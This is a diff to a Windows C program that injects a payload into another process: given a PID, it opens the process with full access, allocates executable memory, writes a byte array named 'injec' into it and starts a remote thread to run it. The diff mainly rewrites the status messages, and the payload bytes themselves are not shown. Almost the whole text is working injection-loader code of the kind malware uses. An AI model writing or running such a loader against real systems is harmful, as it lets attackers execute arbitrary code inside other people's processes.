@@ -1,11 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
 
-const char* k = "[+]";
-const char* i = "[*]";
-const char* e = "[-]";
-
-
 LPVOID rBuffer = NULL;
 DWORD PID, TID = NULL;
 HANDLE hProcess, hThread = NULL;
@@ -51,15 +46,14 @@ unsigned char injec[] =
 
 
 int main(int argc, char* argv[]) {
-	// printf("%s everything's is working!\n", k);
 
 	if (argc < 2) {
-		printf("%s Usage: program.exe <PID>\n", e);
+		printf("[-] Usage: program.exe <PID>\n");
 		return EXIT_FAILURE;
 	}
 
 	PID = atoi(argv[1]);
-	printf("%s Trying to open a handle to process (%ld)\n", i, PID);
+	printf("[*] Trying to open a handle to process (%ld)\n", PID);
 
 	hProcess = OpenProcess(
 		PROCESS_ALL_ACCESS,
@@ -68,11 +62,11 @@ int main(int argc, char* argv[]) {
 	);
 
 	if (hProcess == NULL) {
-		printf("%s Couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
+		printf("[-] Couldn't get a handle to the process (%ld), error: %ld", PID, GetLastError());
 		return EXIT_FAILURE;
 	}
 
-	printf("%s Got a handle to the process!\n\\---0X%p\n", k, hProcess);
+	printf("[+] Got a handle to the process!\n\\---0X%p\n", hProcess);
 
 	/* Allocate bytes to process memory */
 	rBuffer = VirtualAllocEx(
@@ -81,7 +75,7 @@ int main(int argc, char* argv[]) {
 		sizeof(injec),
 		(MEM_COMMIT | MEM_RESERVE),
 		PAGE_EXECUTE_READWRITE);
-	printf("%s Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(injec));
+	printf("[+] Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", sizeof(injec));
 
 	/* Actually write that allocated memory to the process memory */
 	WriteProcessMemory(
@@ -90,9 +84,9 @@ int main(int argc, char* argv[]) {
 		injec,
 		sizeof(injec),
 		NULL);
-	printf("%s Wrote %zu-bytes with to process memory\n", k, sizeof(injec));
+	printf("[+] Wrote %zu-bytes with to process memory\n", sizeof(injec));
 
-	/* Create thread to run our payload */
+	/* Create thread to run payload */
 	hThread = CreateRemoteThreadEx(
 		hProcess,
 		NULL,
@@ -104,20 +98,20 @@ int main(int argc, char* argv[]) {
 		&TID);
 
 	if (hThread == NULL) {
-		printf("%s Failed to get a handle to the thread, error: %ld", e, GetLastError());
+		printf("[-] Failed to get a handle to the thread, error: %ld", GetLastError());
 		CloseHandle(hProcess);
 		return EXIT_FAILURE;
 	}
-	printf("%s Got a handle to the thread (%ld)\n\\--0x%p\n", k, TID, hThread);
+	printf("[+] Got a handle to the thread (%ld)\n\\--0x%p\n", TID, hThread);
 
-	printf("%s Waiting for thread to finish\n", k);
+	printf("[+] Waiting for thread to finish\n");
 	WaitForSingleObject(hThread, INFINITE);
-	printf("%s Thread finished executing\n", k);
+	printf("[+] Thread finished executing\n");
 
-	printf("%s Cleaning up\n", i);
+	printf("[*] Cleaning up\n");
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
-	printf("%s Finished! See you next time :)\n", k);
+	printf("[+] Finished! See you next time :)\n");
 
 	return EXIT_SUCCESS;
 
